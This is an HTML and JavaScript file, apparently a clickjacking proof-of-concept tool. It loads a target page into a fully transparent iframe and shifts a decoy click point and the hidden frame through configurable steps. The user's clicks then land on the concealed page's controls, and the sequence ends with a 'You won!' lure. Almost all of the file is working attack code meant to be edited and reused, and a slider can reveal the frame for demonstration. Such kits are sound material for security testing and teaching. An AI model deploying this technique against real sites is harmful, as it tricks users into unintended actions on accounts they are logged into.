<html>
<head>
<title>Clickjacking Proof-of-Concept-Exploit</title>
<!-- USAGE
Edit the config below as needed.
-->
<script>
var config = {
    "url":"http://fallout.skora.net/security/clickjacking-victim.html",	// Start URL of victim
    "steps": [
	{
	    "x": 11,			// Coordinates of the click point
	    "y": 134,
	    "next": "mouseover",	// Trigger for next click point - mouseover: on mouse touch - load: on load event of the frame
	    "delay": 1000,		// Delay before next click point is shown
	    "content": "&times;"	// Content of the click point - left untouched if missing
	},
	{
	    "x": 20,
	    "y": 13,
	    "framex": -30,		// Coordinates of the frame - left untouched if missing
	    "framey": -200,
	    "next": "load"
	},
	{
	    "x": 220,
	    "y": 101,
	    "framex": 0,
	    "framey": 0,
	    "next": "mouseover",
	    "delay": 2000
	},
	{
	    "x": 500,
	    "y": 300,
	    "content":"<span style='font-size:64px;'>You won!</span>"
	},
    ]
};
var cur = 0;
var curcp = config.steps[cur];
var init = true;
var frameInit = false;

function setOpacity() {
    document.getElementById("frm").style.opacity = document.getElementById("opacity").value;
}

function initFrame() {
    frameInit = true;
    document.getElementById("frm").src = config.url;
}

function doInit() {
    document.getElementById("cp").style.display = "inline";
    initClickpoint();
}

function initClickpoint() {
    var cp = document.getElementById("cp");
    var frm = document.getElementById("frm");
    var curcp = config.steps[cur];
    cp.style.left = curcp.x;
    cp.style.top = curcp.y;
    if (curcp.framex != undefined && curcp.framey != undefined) {
	frm.style.left = curcp.framex;
	frm.style.top = curcp.framey;
    }
    if (curcp.content) {
	cp.innerHTML = curcp.content;
    }
    if (curcp.next == "mouseover") {
	cp.style.zIndex = 10;
    }
}

function nextClickpoint() {
    if (config.steps[++cur]) {
	var curcp = config.steps[cur];
	initClickpoint();
    }
}

function frameLoad() {
    if (frameInit && init) {
	frameInit = false;
	init = false;
	doInit();
    } else if (config.steps[cur].next == "load") {
	nextClickpoint();
    }
}

function cpMouseOver() {
    if (curcp.next == "mouseover") {
	cp.style.zIndex = -10;
	if (curcp.delay > 0) {
	    setTimeout(nextClickpoint, curcp.delay);
	}
    }
}
</script>
</head>
<body onload="initFrame()">
<iframe id="frm" style="position:absolute;border:0px;top:0px;left:0px;width:1000;height:600;opacity:0;z-index:5;" onload="frameLoad();"></iframe>
<div id="cp" style="position:fixed;display:none;z-index:-10;" onmouseover="cpMouseOver()"></div>
<div style="position:fixed;right:0px;bottom:0px;">
    <input id="opacity" type="range" min="0" max="1" step="0.01" value="0" oninput="setOpacity()" onchange="setOpacity()">
</div>
</body>
</html>
